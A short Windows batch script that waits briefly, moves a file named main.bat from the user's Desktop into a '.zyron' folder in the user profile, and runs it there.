@echo off
ping localhost -n 2 >nul
cd %userprofile%\Desktop

move main.bat %userprofile%\.zyron
cd %userprofile%\.zyron
main.bat
exit